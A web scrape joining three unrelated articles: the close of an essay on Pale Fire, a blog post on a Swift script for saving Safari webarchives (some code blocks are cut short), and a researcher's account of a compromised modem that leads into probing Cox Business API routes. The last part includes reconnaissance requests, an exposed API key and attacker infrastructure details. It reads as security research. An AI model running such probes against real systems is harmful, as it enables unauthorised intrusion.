a voice reminiscent of Humbert sans Dolores on a drunken drive with drunken Rita on the perpetual road to Grainball: the voice of someone broken and desperate yet mentally agile enough to bob and weave under a rain of blows, real and imagined; someone too broken and desperate to fully dissemble). The actual prose was, as Ron Rosenbaum noted, a great sensual pleasure. Then, about 200 pages in, the experience intensified when I came to this description of a secondary character, Queen Disa, the woman Kinbote/Charles indifferently marries because marry he must:</p></div><div>  <p><em>‘What had the sentiments he entertained in regard to Disa ever amounted to? Friendly indifference and bleak respect. Not even in the first bloom of their marriage had he felt any tenderness or any excitement. Of pity, of heartache, there could be no question. He was, had always been, casual and heartless. But the heart of his dreaming self, both before and after the rupture, made extraordinary amends.”</em></p> <p>This is a narrative depth change, with no lightness or giddiness or humour. I sometimes read this section to students as an example of how a narrative can be indirectly and deeply illuminated through minor characters or descriptive asides, and no matter who they are, grad students or sophomores taking the class to fulfil a Lit major, I can feel their attention come into focus from the first two lines. Even with minimal information about who the speaker or the woman he is speaking of might be, almost any nominal adult, no matter how inexperienced, can recognise the emotional reality of those sentences that open the soliloquy.</p> <p><em>“He dreamed of her more often, and with incomparably more poignancy, than his surface-life feelings for her warranted; these dreams occurred when he least thought of her, and worries in no way connected with her assumed her image in the subliminal world as a battle or a reform becomes a bird of wonder in a tale for children. These heart-rending dreams transformed the drab prose of his feelings for her into strong and strange poetry, subsiding undulations of which would flash and disturb him throughout the day, bringing back the pang and the richness — and then only the pang, and then only its glancing reflection — but not at all affecting his attitude towards the real Disa.”</em></p> <p>Here, words create images to describe something that happens wordlessly, physically but subtly, in the inchoate realm of feeling. The words “subsiding undulations” which “flash” and then gradually fade (as a wave returns and fades) describe the movement of intimate emotion, the way people repeatedly draw near one another and then move away, sometimes simultaneously, in different aspects. The words also describe the bodily experience of strong feeling in a single person, rising up and then subsiding, either becoming greater or — as it is here — fading completely but for a troubling echo that lingers so faintly you can’t tell where it’s coming from. It is something almost impossible to talk about let alone write about but which almost everyone experiences. Using words to describe what is experienced wordlessly is art on a high level, at least as impressive and more affecting than even the most intricate structuring.</p> <p><em>“Her image, as she entered and re-entered his sleep rising apprehensively from a distant sofa or going in search of the messenger who, they said, had just passed through the draperies, took into account changes of fashion; but the Disa wearing the dress he had seen on her the summer of the Glass Works explosion, or last Sunday, or in any other antechamber of time, forever remained exactly as she looked on the day he had first told her he did not love her. That happened during a hopeless trip to Italy, in a lakeside hotel garden — roses, black araucarias, rusty, greenish hydrangeas — one cloudless evening with the mountains of the far shore swimming in a sunset haze and the lake all peach syrup regularly rippled with pale blue, and the captions of a newspaper spread flat on the foul bottom near the stone bank perfectly readable through the shallow diaphanous filth, and because, upon hearing him out, she sank down on the lawn in an impossible posture, examining a grass culm and frowning, he had taken his words back at once; but the shock had fatally starred the mirror, and thenceforth in his dreams her image was infected with the memory of that confession as with some disease or the secret aftereffects of a surgical operation too intimate to be mentioned.”</em></p> <p>The pain of unrequited love, both for the lover and the loved one who cannot return the feeling, is an obvious subject of the book as is the longing for an ideal which bleeds up through mundane reality, “the shallow diaphanous filth” vs. the fantastic colours, the dream which might be delusional or might actually be more real than acted-out life; the imagery is in effect a crumbling bridge between the two. It is in this passage that I see what I called the understated “essential something” about the book: how this elemental and raw experience is evoked as closely as possible to how it is felt, through the textures of the natural world that exist as the body exists, humbly and unknowably: plants, mountains, water, sky, light, the amazement of colours.</p>  <p><em>“The gist, rather than the actual plot of the dream, was a constant refutation of his not loving her. His dream-love for her exceeded in emotional tone, in spiritual passion and depth, anything he had experienced in his surface existence. This love was like an endless wringing of hands, like a blundering of the soul through an infinite maze of hopelessness and remorse. They were, in a sense, amorous dreams, for they were permeated with tenderness, with a longing to sink his head onto her lap and sob away the monstrous past. They brimmed with the awful awareness of her being so young and so helpless. They were purer than his life. What carnal aura there was in them came not from her but from those with whom he betrayed her… and even so the sexual scum remained somewhere far above the sunken treasure and was quite unimportant.”</em></p> <p><em>A blundering of the soul through an infinite maze of hopelessness and remorse. </em>This secondary character may be, as some critics say, a figment of Kinbote’s narcissistic imagination; she may be an alt-world creation of the deceased Hazel Shade. But whatever she is, the complex of emotions embodied in and provoked by her are real in any existing human world, as deep and for me more riveting than any problem posed anywhere else in the book. It is the mystery of human feeling/lack of feeling, the need for love and the fear of it, part of what Kinbote calls “the prison of personality” and it is not going to be solved. But here at least it is seen profoundly, with the compassionate wisdom that is the real “Crown Jewels” of <em>Pale Fire, </em>hidden in a description of an incidental relationship.</p> <p>Of course, there are other jewels hidden elsewhere in the book, more than might be addressed within the scope of this essay. Brian Boyd quotes Nabokov remarking in relation to <em>Pale Fire </em>that: “You can get nearer and nearer, so to speak, to reality; but you can never get near enough because reality is an infinite succession of steps, levels of perception, false bottoms and hence unquenchable, unattainable.” The novel is a joyful and reverent mimic of such reality — and yet it invites readers and critics to come close, to find the unattainable, and so, with great gusto, they try. And I am glad that they do, even if it sometimes looks a bit like blundering through an infinite maze of some sort. I am especially glad for Brian Boyd and Michael Wood; over time, reading and learning from their intrepid analyses has deepened my understanding and respect for the book. But I still remember, as something rare and unrepeatable, the power of my first reading when I had so little knowledge and yet felt the brilliance and depth of <em>Pale Fire </em>almost as if through my skin. If reading this is your first experience of the book, that is what I hope for you: that you acquire a copy and see the griffin come in for a landing. If you worry that it is looking down on you, don’t. Because all you have to do is look up. Its heart is strange but it is huge; let yours beat in response.</p> <p><strong>***</strong></p> <p><em>Pale Fire, with an introduction by Mary Gaitskill, is <a href="https://www.amazon.co.uk/Pale-Fire-W-N-Essentials/dp/1474620876" target="_blank" rel="noopener">published by Weidenfeld &amp; Nicolson</a>.</em></p>   <hr>   </div></div>]]></description>

<div id="readability-page-1" class="page"><div id="main" tabindex="-1"> <article>   <p>Recently I’ve been trying to create a local archive of my bookmarked web pages. I already have tools to <a href="https://alexwlchan.net/2024/scheduled-screenshots/">take screenshots</a>, and I love them as a way to take quick snapshots and skim the history of a site, but bitmap images aren’t a great archival representation of a website. What if I also want to save the HTML, CSS, and JavaScript, and keep an interactive copy of the page?</p> <p>There are lots of tools in this space; for my personal stuff I’ve come to like <a href="https://en.wikipedia.org/wiki/Webarchive">Safari webarchives</a>. There are several reasons I find them appealing:</p> <ul> <li> <p><strong>Each saved web page is stored as a single file.</strong> Each file includes the entire content of the page, and a single file per web page is pretty manageable. I can create backups, keep multiple copies, and so on.</p> </li> <li> <p><strong>I can easily add pages to my archive that can’t be crawled from the public web.</strong> Lots of the modern web is locked behind paywalls, login screens, interstitial modals that are difficult for automated crawlers to get past. It’s much easier for me to get through them as a human using Safari as my default browser. Once I have a page open, I can save it as a webarchive with the <code>File &gt; Save As…</code> menu item.</p> </li> <li> <p><strong>The archive can be stored locally and offline.</strong> It will always remain available to me, as long as I keep up with backups and maintenance, and I can archive private web pages that I don’t want to put in somebody else’s archive. (For example, I wouldn’t want to save private tweets in the publicly available Wayback Machine.)</p> </li> <li> <p><strong>I can read the format without Safari.</strong> Although Safari is only maintained by Apple, the Safari webarchive format can be read by non-Apple tools – it’s a <a href="https://alexwlchan.net/til/2024/whats-inside-safari-webarchive/">binary property list</a> that stores the raw bytes of the original files. I’m comfortable that I’ll be able to open these archives for a while, even if Safari unexpectedly goes away.</p> </li> </ul> <p>The one thing that’s missing is a way to create webarchive files programatically. Although I could open each page and save it in Safari individually, I have about 6000&nbsp;bookmarks – I’d like a way to automate this process.</p> <p>I was able to write a short script in Swift that does this for me. In the rest of this article I’ll explain how it works, or you can <a href="https://github.com/alexwlchan/safari-webarchiver/">skip to the GitHub repo</a>.</p> <h2 id="prior-art-newzealandpaulwebarchiver">Prior art: newzealandpaul/webarchiver</h2> <p>I found an existing tool for creating Safari webarchives on the command line, <a href="https://github.com/newzealandpaul/webarchiver">written by newzealandpaul</a>.</p> <p>I did some brief testing and it seems to work okay, but I had a few issues. The error messages aren’t very helpful – some of my bookmarks failed to save with an error like “invalid URL”, even though the URL opens just fine. I went to read the code to work out what was happening, but it’s written in Objective‑C and uses deprecated classes like <a href="https://developer.apple.com/documentation/webkit/webview"><code>WebView</code></a> and <a href="https://developer.apple.com/documentation/webkit/webarchive"><code>WebArchive</code></a>.</p> <p>Given that it’s only about 350&nbsp;lines, I wanted to see if I could rewrite it using Swift and the newest classes. I thought that might be easier than trying to understand a language and classes that I’m not super familiar with.</p> <h2 id="playing-with-wkwebview-and-createwebarchivedata">Playing with <code>WKWebView</code> and <code>createWebArchiveData</code></h2> <p>It didn’t take much googling to learn that <code>WebView</code> has been replaced by <a href="https://developer.apple.com/documentation/webkit/wkwebview"><code>WKWebView</code></a>, and that class has a method <a href="https://developer.apple.com/documentation/webkit/wkwebview/3650491-createwebarchivedata"><code>createWebArchiveData</code></a> which “creates a web archive of the web view’s current contents asynchronously”. Perfect!</p> <p>I watched a <a href="https://developer.apple.com/videos/play/wwdc2020/10188/">WWDC session</a> by Brady Eison, a WebKit engineer, where the <code>createWebArchiveData</code> API was introduced. It gave me some useful context about the purpose of <code>WKWebView</code> – it’s for showing web content inside Mac and iOS apps. If you’ve ever used an in-app browser, there was probably an instance of <code>WKWebView</code> somewhere underneath.</p> <p>The session included some sample code for using this API, which I fashioned into an initial script:</p> <div><pre><code><span>import</span> <span>WebKit</span>

The script did run, but it only created an empty file.</p> <p>I did a little debugging, and I realised that my <code>WKWebView</code> was never actually loading the web page. I pointed it at a local web server, and I could see it wasn’t fetching any data. Hmm.</p> <h2 id="we-need-a-loop-de-loop">We need a loop-de-loop</h2> <p>Using a <code>WKWebView</code> inside a Swift script isn’t how it’s normally used. Most of the time, it appears as part of a web browser inside a Mac or iOS app. In that context, you don’t want fetching web pages to be a blocking operation – you want the rest of the app to remain responsive and usable, and download the web page as a background operation.</p> <p>This made me wonder if my problem was that my script doesn’t have “background operations”. When I ask <code>WKWebView</code> to load my page, it’s getting shoved in a queue of background tasks, but nothing is picking up work from that queue. I don’t fully understand what I did next, but I think I’ve got the gist of the problem.</p> <p>I had another look at newzealandpaul’s code, and I found <a href="https://github.com/newzealandpaul/webarchiver/blob/4d04669a9cb3f8a7e5ab492e7c3a4175b5586ac5/KBWebArchiver.m#L214-L222">some lines</a> that look a bit like they’re solving the same problem. I think the <code>NSRunLoop</code> is doing work that’s on that background queue, and it’s waiting until the page has finished loading:</p> <div><pre><code><span>// Wait until the site has finished loading.</span>
<span>NSRunLoop</span> <span>*</span><span>currentRunLoop</span> <span>=</span> <span>[</span><span>NSRunLoop</span> <span>currentRunLoop</span><span>];</span>
<span>NSTimeInterval</span> <span>resolution</span> <span>=</span> <span>_localResourceLoadingOnly</span> <span>?</span> <span>0</span><span>.</span><span>1</span> <span>:</span> <span>0</span><span>.</span><span>01</span><span>;</span>
<span>BOOL</span> <span>isRunning</span> <span>=</span> <span>YES</span><span>;</span>

<span>while</span> <span>(</span><span>isRunning</span> <span>&amp;&amp;</span> <span>_finishedLoading</span> <span>==</span> <span>NO</span><span>)</span> <span>{</span>
  <span>NSDate</span> <span>*</span><span>next</span> <span>=</span> <span>[</span><span>NSDate</span> <span>dateWithTimeIntervalSinceNow</span><span>:</span><span>resolution</span><span>];</span>
  <span>isRunning</span> <span>=</span> <span>[</span><span>currentRunLoop</span> <span>runMode</span><span>:</span><span>NSDefaultRunLoopMode</span> <span>beforeDate</span><span>:</span><span>next</span><span>];</span>
<span>}</span>
</code></pre></div> <p>I was able to adapt this idea for my Swift script, using <code>RunLoop.main.run()</code>. I can track the progress of <code>WKWebView</code> with the <code>isLoading</code> attribute, so I kept running the main loop for short intervals until I could see this attribute change. I realised that <code>createWebArchiveData</code> is also an asynchronous operation that runs in the background, so I need to wait for that to finish too.</p> <p>I added these two functions to <code>WKWebView</code>. Here’s my updated script:</p> <div><pre><code><span>import</span> <span>WebKit</span>

</code></pre></div> <p>This works, but there’s a fairly glaring hole – it will archive whatever got loaded into the web view, even if the page wasn’t loaded successfully. Let’s fix that next.</p> <h2 id="checking-the-page-loaded-successfully-with-wknavigationdelegate">Checking the page loaded successfully with <code>WKNavigationDelegate</code></h2> <p>If there’s some error getting the page – say, my Internet connection is down or the remote server doesn’t respond – the <code>WKWebView</code> will still complete loading and set <code>isLoading = false</code>. My code will then proceed to archive the error page, which is unhelpful. I’d rather the script threw an error, and prompted me to investigate.</p> <p>While I was reading more about <code>WKWebView</code>, I came across the <a href="https://developer.apple.com/documentation/webkit/wknavigationdelegate"><code>WKNavigationDelegate</code></a> protocol. If you implement this protocol, you can track the progress of a page load, and get detailed events like “the page has started to load” and “the page failed to load with an error”.</p> <p>There are <a href="https://developer.apple.com/documentation/webkit/wknavigationdelegate#2172386">two methods</a> you can implement, which will be called if an error at different times during page load. Because I’m working in a standalone script, I just have them print an error and then terminate the process – I don’t need more sophisticated error handling than that.</p> <p>I also wrote a method that checks the HTTP status code of the response, and terminates the script if it’s not an HTTP&nbsp;200 OK. This means that 404 pages and server errors won’t be automatically archived – I can do that manually in Safari if I think they’re really important.</p> <p>Here’s the delegate I wrote:</p> <div><pre><code><span>/// Print an error message and terminate the process if there are</span>

It worked pretty well, and captured 85% of my bookmarks – the remaining 15% are broken due to <a href="https://en.wikipedia.org/wiki/Link_rot">link rot</a>. I did a spot check of a few dozen archives that did get saved, and they all look good.</p> <p>My script worked correctly in the happy path, but I went back and improved some of the error messages. I saw a lot of different failures when archiving such a wide variety of URLs, including esoteric HTTP status codes, expired TLS certificates, and a couple of redirect loops. Now those errors are reported in a bit more detail and not just “something went wrong”.</p> <p>I also tweaked the code so it won’t replace an existing webarchive file. I do this by <a href="https://alexwlchan.net/til/2024/how-to-do-exclusive-file-write-in-swift/">adding <code>.withoutOverwriting</code> to my <code>write()</code> call</a>. I don’t want to risk overwriting a known-good archive of a page with a copy that’s now broken.</p> <h2 id="the-finished-script">The finished script</h2> <p>I’ve put the script in a new GitHub repository: <a href="https://github.com/alexwlchan/safari-webarchiver">alexwlchan/safari-webarchiver</a>. This repo will be the canonical home for this code, and I’ll post any updates there.</p> <p>It includes the final copy of the code in this post, a small collection of tests, and some instructions on how to download and use the finished script.</p> </article> </div></div>]]></description>

<div id="readability-page-1" class="page"><div><h2 id="introduction">Introduction</h2>
<p>Two years ago, something very strange happened to me while working from my home network. I was exploiting a blind XXE vulnerability that required an external HTTP server to smuggle out files, so I spun up an AWS box and ran a simple Python webserver to receive the traffic from the vulnerable server:</p>
<pre><code>python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
</code></pre>
<p>Once the webserver was running, I sent a cURL request from my home computer to make sure that it could receive external HTTP requests:</p>
<pre><code>curl "http://54.156.88.125:8000/test123"
</code></pre>
<p>Just a few seconds later, I saw the following log:</p>
<pre><code>98.161.24.100 - [16:32:12] "GET /test123 HTTP/1.1"
</code></pre>
<p>Perfect, this meant that I was able to receive network traffic on the box. Everything seemed good to go, but right as I switched back to exploiting the vulnerability, something very unexpected appeared in my log file:</p>
<pre><code>98.161.24.100 - [16:32:12] "GET /test123 HTTP/1.1"
159.65.76.209 - [16:32:22] "GET /test123 HTTP/1.1"
</code></pre>
<p>An unknown IP address had replayed the exact same HTTP request just 10 seconds later.</p>
<p>"Wow, that’s seriously weird," I thought. Somewhere, between my home network and the AWS box, someone had intercepted and replayed my HTTP traffic. This traffic should not be accessible. There is no intermediary between these two systems who should be seeing this. My immediate thought was that my computer had been hacked and that the hacker was actively monitoring my traffic.</p>
<p>To check if the same behavior occured on a different device, I pulled out my iPhone and typed in the URL into Safari. I sent the request, then peaked at my log file:</p>
<pre><code>98.161.24.100 - [16:34:04] "GET /uhhhh HTTP/1.1"
159.65.76.209 - [16:34:16] "GET /uhhhh HTTP/1.1"
</code></pre>
<p>The same unknown IP address had intercepted and replayed both HTTP requests from my computer and iPhone. Somehow, someone was intercepting and replaying the web traffic from likely every single device on my home network.</p>
<p>Panicked, I spun up a new AWS box running Nginx to make sure that the original instance hadn't been compromised somehow.</p>
<pre><code>sudo service nginx start
tail -f /var/log/nginx/access.log
</code></pre>
<p>I opened the URL once again from my iPhone and saw the exact same logs:</p>
<pre><code>98.161.24.100 - [16:44:04] "GET /whatisgoingon1234 HTTP/1.1"
159.65.76.209 - [16:44:12] "GET /whatisgoingon1234 HTTP/1.1"
</code></pre>
<p>Through what could only be my ISP, modem, or AWS being compromised, someone was intercepting and replaying my HTTP traffic immediately after I'd sent it. To eliminate the absurd idea that AWS had been compromised, I spun up a box on GCP instead and observed the same unknown IP address replaying my HTTP requests. It wasn’t AWS.</p>
<p>The only real option left was that my modem had been hacked, but who was the attacker? I queried the owner of the IP address and found that it belonged to DigitalOcean. Strange. That definitely didn't belong to my ISP.</p>
<h2 id="who-are-you-1596576209">Who are you, 159.65.76.209?</h2>
<p>To kick off an investigation, I sent the IP address to some friends who worked for threat intelligence companies. They sent me a link to the VirusTotal listing for the IP address which detailed all of the domains which resolved to the IP address over the past few years.</p>

<p>Out of the last 5 domains that were tied to the IP address, 3 were phishing websites, and 2 were what appeared to be mail servers. The following domains all at one point in time resolved to the DigitalOcean IP address:</p>
<pre><code>regional.adidas.com.py (2019/11/26)
isglatam.online (2019/12/08)
isglatam.tk (2020/11/11)
mx12.limit742921.tokyo (2021/08/08)
mx12.jingoism44769.xyz (2022/04/12)
</code></pre>
<p>Two of the domains associated with the 159.65.76.209 IP address were <code>isglatam.online</code> and <code>isglatam.tk</code>. These were both at one point in time phishing websites for <code>isglatam.com</code>, a South American cybersecurity company.</p>
<p>After visiting the real ISG Latam website, we learned that they are based out of Paraguay and partnered with Crowdstrike, AppGate, Acunetix, DarkTrace, and ForcePoint. From a 10 minute read of everything, it appeared that the people who were intercepting my traffic had tried to phish ISG Latam using the same IP address.</p>
<h2 id="hackers-hacking-hackers">Hackers Hacking Hackers?</h2>
<p>Now this was odd. The IP address, just one year prior, was being used to host phishing infrastructure that targeted a South American cybersecurity company. Assuming that they have been in control of this IP address for 3 years, it would mean that they have used it for at least 2 different phishing campaigns and what appeared to be a C&amp;C server for router malware?</p>

<p>Through URLscan, I learned that the <code>isglatam.online</code> and <code>isglatam.tk</code> websites were hosting generic BeEF phishing sites that can historically be seen <a href="https://urlscan.io/result/52459337-0f2d-4b26-859f-4a6f4eafa6dd#transactions">here</a>.</p>

<p>The signature of the attacker was super interesting, because they were doing a lot of different malicious activities from the same box and apparently had not gotten suspended in over 3 years. It was really hard to piece together their intent with the Adidas, ISG Latam, and modem hacking thing all coming from the same IP address. There was a chance that the IP had rotated between different owners over the years, but it didn't seem likely as the gaps in between everything were long and it was unlikely that it was immediately reassigned to another malicious party.</p>
<p>Realizing that the infected device was still running, I walked over, unplugged it, and placed it into a cardboard box.</p>
<h2 id="handing-over-evidence">Handing Over Evidence</h2>
<p>The modem that I had been using was the Cox Panoramic Wifi gateway. After learning that it was likely compromised, I went to the local Cox store to show them my device and ask for a new one.</p>

<p>The one issue with this request was that in order for me to receive a new modem, I had to hand over the old one. Sadly, it wasn't actually my property — I was only <em>renting</em> it from the ISP. I explained to the employee how I wanted to keep and reverse engineer the device. Their eyes shot up a little bit. They were much less enthusiastic about giving it back to me.</p>
<p>“There’s no way I can keep it?” I asked. “No, we need to take your old one to give you a new one,” the ISP representative said. There was no budging. As much as I wanted to take it apart, dump the firmware, and see if there was any trace of whatever potentially compromised it, I had already passed the device off to the employee. I took my new device and left the store, disappointed that I wasn’t able to do anything more with it.</p>
<p>After setting up the new modem, the previous behavior completely stopped. My traffic was no longer being replayed. There was no "other IP" in the logs. Everything seemed fixed.</p>
<p>With a bit of dissapointment I concluded that the modem I no longer had access to was what had been compromised. Since I’d handed it over to the ISP and replaced the device, there wasn’t anything more that I could investigate besides maybe seeing if my computer had gotten hacked.</p>
<p>I gave up trying to figure it out. At least for the time being.</p>
<h2 id="three-years-later">Three Years Later</h2>
<p>In early 2024, almost three years later, I was on vacation with some friends who also worked in cybersecurity. We were having a conversation over dinner when I explained the story to them. Curious to learn more, they asked me for all of the details and thought it’d be fun to run their own investigation.</p>
<p>The first thing that caught their attention (having worked on more malware analysis a lot more than I had) was the format of the two mail server domains (<code>limit742921.tokyo</code> and <code>jingoism44769.xyz</code>). They pulled the IP address of the <code>mx1</code> subdomain for <code>limit742921.tokyo</code> and then ran a reverse IP search on all domains that had at one point in time pointed to that same IP address. There were over 1,000 domains that all followed the exact same pattern...</p>
<pre><code><span>{</span><span>"rrname"</span><span>:</span><span>"acquire543225.biz."</span><span>,</span><span>"rrtype"</span><span>:</span><span>"A"</span><span>,</span><span>"rdata"</span><span>:</span><span>"153.127.55.212"</span><span>}</span>

</code></pre>
<p>Every single domain that was registered by the discovered IP address used the same naming convention:</p>
<pre><code>[word][6 numbers].[TLD]
</code></pre>
<p>Due to the mass-number of domains and algorithmic structure of the registered address, this appeared to be a domain generation algorithm used by malware operators to rotate the resolving address for the C&amp;C server for the purpose of obfuscation. There was a good chance that the IP address replaying my traffic was a C&amp;C server, and the two domains which I thought were mail servers were actually algorithmically generated pointers to the C&amp;C server.</p>

<p>Something disappointing was that all of these domains were historical; the last one seen was registered on March 17, 2023. None of the hosts resolved to anything anymore, and we couldn’t seem to identify anything similar being registered to the same IP address.</p>
<p>Given that my new modem was the same model that had been compromised, I was curious if the attacker had found a way back in. From a quick Google search I’d learned that there were no public vulnerabilities for the model of modem that I had (even though it was now 3 years later) so if there was an exploit, they were doing a great job keeping it private.</p>
<p>The other option that seemed more-and-more likely was that they had exploited something outside of a generic router exploit. I was super curious to investigate this and try to brainstorm ways that my device could’ve been compromised.</p>
<h2 id="targeting-rest-apis-using-the-tr-069-protocol">Targeting REST APIs using the TR-069 Protocol</h2>
<p>After getting back home, a close friend had asked if I’d be able to help him move furniture into his new house. What this also meant was helping him transfer over his Cox modem. After connecting his device to the fiber line, I went ahead and called the ISP support and asked if they’d be able to push out an update to allow the device to work in the new location. The agent confirmed they could remotely update the device settings, including changing the WiFi password and viewing connected devices.</p>
<p>The ability of support agents to control devices really interested me, especially since they could update pretty much anything on the device. This extensive access was facilitated by a protocol known as TR-069, implemented in 2004, which allowed ISPs to manage devices within their own network via port 7547. This protocol had already been the subject of a few great DEF CON talks and wasn’t externally exposed, so I wasn’t super interested in bug hunting the protocol itself. What I was interested in, however, were the tools that the support agent was using to manage the device.</p>

<p>To theorycraft a little bit, if I were a hacker who wanted to compromise my modem I'd likely target whatever infrastructure powered the support tools that the agents were using. There was probably some internal website for device management that support agents used, backed by an API that could execute arbitrary commands and change/view administrative settings of customer devices. If I could find some way to access this functionality, it might shed light on how I might have been originally hacked and patch out at least one method for someone to compromise my modem.</p>
<h2 id="hacking-millions-of-modems">Hacking Millions of Modems</h2>
<p>The first thing that I decided to look at was the Cox Business portal. This app had a ton of interesting functionality to remotely manage devices, set firewall rules, and monitor network traffic.</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fq6bmDy5.png&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fq6bmDy5.png&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fq6bmDy5.png&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fq6bmDy5.png&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fq6bmDy5.png&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fq6bmDy5.png&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fq6bmDy5.png&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fq6bmDy5.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2Fq6bmDy5.png&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>Without actually having a Cox business account myself, I opened the login page for the portal and grabbed a copy of the <code>main.36624ed36fb0ff5b.js</code> file that powered the core functionality of the app. After beautifying it, I parsed out all of the routes and scrolled through them:</p>
<pre><code>/api/cbma/voicemail/services/voicemail/inbox/transcribeMessage/
/api/cbma/profile/services/profile/userroles/
/api/cbma/accountequipment/services/accountequipment/equipments/eligibleRebootDevice
/api/cbma/accountequipment/services/accountequipment/casedetail
/api/cbma/user/identity/services/useridentity/user/verifyContact
/api/cbma/user/identity/services/useridentity/user/contact/validate
...
</code></pre>
<p>There were over 100 different API calls that all had the same base path of <code>/api/cbma/</code>. Since this route seemed to be power most device-related functionality, I thought it was worth investigating if the <code>/api/cbma/</code> endpoint happened to be a reverse proxy to another host. I tested this by sending the following requests:</p>
<h3 id="http-request-that-does-not-start-with-apicbma-returns-301">HTTP request that does not start with api/cbma (returns 301):</h3>
<pre><code><span>GET</span> <span>/api/anything_else/example</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>myaccount-business.cox.com</span>
</code></pre>
<pre><code><span>HTTP/1.1</span> <span>301</span> <span>Moved</span> <span>Permanently</span>
<span>Location:</span> <span>https://myaccount-business.cox.com/cbma/api/anything_else/example</span>
</code></pre>
<h3 id="http-request-that-does-start-with-apicbma-returns-500">HTTP request that does start with api/cbma (returns 500):</h3>
<pre><code><span>GET</span> <span>/api/cbma/example</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>myaccount-business.cox.com</span>
</code></pre>
<pre><code><span>HTTP/1.1</span> <span>500</span> <span>Internal</span> <span>Server</span> <span>Error</span>
<span>Server:</span> <span>nginx</span>
</code></pre>
<p>From sending the above HTTP requests, we learn that the <code>api/cbma</code> endpoint is an explicit route that is likely a reverse proxy to another host due to the differing behavior around the HTTP response. When we request anything besides <code>api/cbma</code>, it responds with a 302 redirect instead of the 500 internal server error triggered from <code>api/cbma</code>.</p>
<p>This indicated that they were proxying API requests to a dedicated backend while serving the frontend files from the normal system.</p>
<p>Since the API itself had all of the interesting device management functionality, it made sense to focus on everything behind the <code>api/cbma</code> route and see if there was any low hanging fruit like exposed actuators, API documentation, or any directory traversal vulnerabilities that would allow us to escalate permissions.</p>
<p>I went ahead and proxied the registration request for the Cox Business portal which was underneath the <code>api/cbma</code> path:</p>
<pre><code><span>POST</span> <span>/api/cbma/userauthorization/services/profile/validate/v1/email</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>myaccount-business.cox.com</span>
<span>User-Agent:</span> <span>Mozilla/5.0</span> <span>(Windows</span> <span>NT</span> <span>10.0</span><span>;</span> <span>Win64;</span> <span>x64;</span> <span>rv:124.0)</span> <span>Gecko/20100101</span> <span>Firefox/124.0</span>
<span>Accept:</span> <span>application/json,</span> <span>text/plain,</span> <span>*/*</span>
<span>Content-Type:</span> <span>application/json</span>
<span>Clientid:</span> <span>cbmauser</span>
<span>Apikey:</span> <span>5d228662-aaa1-4a18-be1c-fb84db78cf13</span>

<span>Ma_transaction_id:</span> <span>a85dc5e0-bd9d-4f0d-b4ae-4e284351e4b4</span>
<span>Content-Length:</span> <span>28</span>
<span>Connection:</span> <span>close</span>

{<span>"email"</span><span>:"test@example.com"</span>}
</code></pre>
<pre><code><span>HTTP/1.1</span> <span>200</span> <span>OK</span>
<span>Content-Type:</span> <span>application/json</span>
<span>Content-Length:</span> <span>126</span>

{
  <span>"message":</span> <span>"Success"</span>,
  <span>"id":</span> <span>"test@example.com"</span>
}
</code></pre>
<p>The HTTP request contained a bunch of different authorization headers including what looked to be a general-use API key that was shared between users. The <code>clientid</code> and <code>Cb_session</code> keys looked very custom and indicated there were multiple roles and permissions used in the application.</p>
<p>The HTTP response looked like a generic Spring response, and we could likely quickly confirm that the backend API was running spring by simply changing the POST to GET and observing the response:</p>
<pre><code><span>GET</span> <span>/api/cbma/userauthorization/services/profile/validate/v1/email</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>myaccount-business.cox.com</span>
</code></pre>
<pre><code><span>HTTP/1.1</span> <span>500</span> <span>Internal</span> <span>Server</span> <span>Error</span>
<span>Content-type:</span> <span>application/json</span>

{
  <span>"timestamp":</span> <span>"2024-04-12T08:57:14.384+00:00"</span>,
  <span>"status":</span> <span>500</span>,
  <span>"error":</span> <span>"Internal Server Error"</span>,
  <span>"path":</span> <span>"/services/profile/validate/v1/email"</span>
}
</code></pre>
<p>Yup, that was definitely a Spring error. Since we could confirm that the reverse proxy was running Spring, I decided to look for actuators and exposed API docs.</p>
<p>I went ahead and tried to guess the actuator route:</p>
<pre><code><span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/services/profile/validate/v1/email/actuator/</span>
<span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/services/profile/validate/v1/actuator/</span>
<span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/services/profile/validate/actuator/</span>
<span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/services/profile/actuator/</span>
<span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/services/actuator/</span>
<span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/actuator/</span>
<span>❌</span> <span>GET</span> <span>/api/cbma/actuator/</span>
</code></pre>
<p>Shame, no easy actuators. I then checked for accessible API documentation:</p>
<pre><code><span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/services/profile/validate/v1/email/swagger-ui/index.html</span>
<span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/services/profile/validate/v1/swagger-ui/index.html</span>
<span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/services/profile/validate/swagger-ui/index.html</span>
<span>❌</span> <span>GET</span> <span>/api/cbma/userauthorization/services/profile/swagger-ui/index.html</span>
